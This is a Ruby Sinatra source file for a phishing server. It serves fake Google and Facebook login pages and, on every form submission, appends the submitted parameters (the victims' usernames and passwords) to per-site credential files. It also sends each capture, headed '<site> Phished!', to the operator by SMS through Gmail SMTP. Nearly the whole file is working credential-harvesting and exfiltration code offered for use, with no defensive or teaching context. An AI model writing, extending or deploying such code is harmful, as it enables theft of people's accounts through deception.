#!/usr/bin/ruby
require 'sinatra'
require 'mail'
require 'dotenv/load'

#
# Sends email with the cracked password.
# TODO: add notification field to creation form to
# include email and SMS
#
class Notifications
  def initialize
    @mail_send_count = 0
  end

  def mail(subject, body)
    options = { address:              'smtp.gmail.com',
                port:                 587,
                user_name:            ENV['GMAIL_EMAIL'],
                password:             ENV['GMAIL_APP_KEY'],
                authentication:       'plain',
                enable_starttls_auto: true }

    puts "Mail: #{options}, count [#{ @mail_send_count }]"

    Mail.defaults do
      delivery_method :smtp, options
    end

    # Deliver to SMS
    if @mail_send_count < 10
      Mail.deliver do
        to "#{ ENV['SMS_PHONE_NUM'] }@#{ ENV['SMS_CARRIER'] }"
        from 'noreply@hashpass.app'
        subject subject
        body body
      end
      @mail_send_count += 1
    end

    # Deliver to Email
    if false
      Mail.deliver do
        to "#{ ENV['EMAIL_TO'] }"
        from 'noreply@hashpass.app'
        subject subject
        body body
      end
      @mail_send_count += 1
    end
  end
end

class Public < Sinatra::Base
  set :environment, :production if ENV['APP_ENV'] == 'production'

  def initialize
    super
    @notifications = Notifications.new
  end

  def wirte_file(site, txt)
    timestamp = Time.now
    open("creds/#{ site }/#{ site }.txt", 'a') do |f|
      msg = "#{ timestamp }: #{ txt }"
      f.puts msg
      @notifications.mail("#{ site } Phished!", msg)
    end
  end

  not_found do
    File.read(File.join('public', 'index.html'))
  end

  get '/' do
    File.read(File.join('public', 'pages/google-login/index.html'))
  end


  get '/google' do
    File.read(File.join('public', 'pages/google-login/index.html'))
  end
  post '/google' do
    puts "params: #{ params }"
    wirte_file('google', params)
    File.read(File.join('public', 'pages/google-login/index.html'))
  end


  get '/facebook' do
    File.read(File.join('public', 'pages/facebook/index.html'))
  end
  post '/facebook' do
    puts "params: #{ params }"
    wirte_file('facebook', params)
    File.read(File.join('public', 'pages/facebook/index.html'))
  end
end



class Api < Sinatra::Base
  set :environment, :production if ENV['APP_ENV'] == 'production'  

  def initialize
    super
  end
end